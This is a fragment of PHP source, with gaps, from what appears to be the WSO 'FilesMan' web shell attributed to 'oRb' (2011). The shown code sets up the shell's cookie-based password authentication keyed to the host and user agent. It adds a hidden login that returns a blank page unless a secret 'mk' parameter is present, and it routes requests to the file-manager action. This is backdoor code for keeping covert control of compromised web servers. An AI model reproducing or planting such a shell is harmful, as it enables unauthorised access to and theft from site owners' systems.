...
$sh_charset= 'UTF-8';
$sh_fm = 'FilesMan';
$sh_key = md5($_SERVER['HTTP_USER_AGENT']);
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
	prototype(md5($_SERVER['HTTP_HOST'])."key", $sh_key);
}
if(empty($_POST['charset']))
	$_POST['charset'] = $sh_charset;
if (!isset($_POST['ne'])) {
...
/* (С) 11.2011 oRb */
if(!empty($sh_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $sh_pass))
        prototype(md5($_SERVER['HTTP_HOST']), $sh_pass);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $sh_pass))
        hardLogin();
}
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$sh_use_ajax;
function hardLogin() {
	if(!isset($_GET['mk']))
		die('');
}
...
if( empty($_POST['a']) )
	if(isset($sh_fm) && function_exists('action' . $sh_fm))
		$_POST['a'] = $sh_fm;
	else
		$_POST['a'] = 'FilesMan';
